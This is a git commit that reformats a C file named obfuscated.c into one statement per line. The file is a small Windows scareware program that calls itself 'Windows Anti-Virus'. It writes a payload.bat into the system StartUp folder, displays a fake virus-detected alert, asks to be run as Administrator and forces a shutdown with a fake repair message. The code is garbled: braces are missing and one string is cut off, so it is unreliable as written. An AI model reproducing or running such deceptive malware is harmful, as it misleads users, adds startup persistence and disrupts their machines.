9d3cd8a1866f10b5200583a6a05053bc96a08923
zoomer <51061101+calebrwalk5@users.noreply.github.com>
2021-12-28 19:44:45 -0500

    Update obfuscated.c

--- obfuscated.c
+++ obfuscated.c
@@ -1,4 +1,3 @@
-
 #include <Windows.h>
 
 #include <stdio.h>
@@ -8,4 +7,62 @@
 #include <stdlib.h>
 
 #include <ctype.h>
-void tunnel() {system("echo %USERPROFILE%>user");}void tscan() {FILE *f,*fp;char s[800],ch;int i = 0;f=fopen("user","r");if(f==NULL) {exit(0);}while(feof(f)==0)fscanf(f,"%c",&ch);if(ch=='\n') {return 0;}s[i]=ch;i++;}fclose(f);system("echo start 'http:fp=fopen(s,"w");if(fp==NULL)f=fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.bat","w");if(f==NULL)system("cls");remove("user");printf("\nError... Run This Program As Administrator To Continue\n");system("timeout 10");exit(0);}fprintf(f,"\necho off\necho Windows Anti-Virus\npause");fclose(f);system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");exit(0);}fprintf(fp,"\necho off\necho Windows Anti-Virus has dected a virus!\npause");fclose(fp);}void ok()remove("user");}void run()tunnel();tscan();}void pause()printf("\n");system("pause");}int main()system("title Windows Anti-Virus");run();ok();printf("\n|----- Resources Diagnostics -----|\n");printf("\n Checking PC for compatibility\n");system("systeminfo");system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix (4) detected problems.\"");pause();}
+void tunnel() {
+system("echo %USERPROFILE%>user");
+}
+void tscan() {
+FILE *f,*fp;
+char s[800],ch;
+int i = 0;
+f=fopen("user","r");
+if(f==NULL) {
+exit(0);
+}
+while(feof(f)==0)
+fscanf(f,"%c",&ch);
+if(ch=='\n') {
+return 0;
+}
+s[i]=ch;
+i++;
+}
+fclose(f);
+system("echo start 'http:fp=fopen(s,"w");
+if(fp==NULL)
+f=fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.bat","w");
+if(f==NULL)
+system("cls");
+remove("user");
+printf("\nError... Run This Program As Administrator To Continue\n");
+system("timeout 10");
+exit(0);
+}
+fprintf(f,"\necho off\necho Windows Anti-Virus\npause");
+fclose(f);
+system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
+exit(0);
+}
+fprintf(fp,"\necho off\necho Windows Anti-Virus has dected a virus!\npause");
+fclose(fp);
+}
+void ok()
+remove("user");
+}
+void run()
+tunnel();
+tscan();
+}
+void pause()
+printf("\n");
+system("pause");
+}
+int main()
+system("title Windows Anti-Virus");
+run();
+ok();
+printf("\n|----- Resources Diagnostics -----|\n");
+printf("\n Checking PC for compatibility\n");
+system("systeminfo");
+system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix (4) detected problems.\"");
+pause();
+}
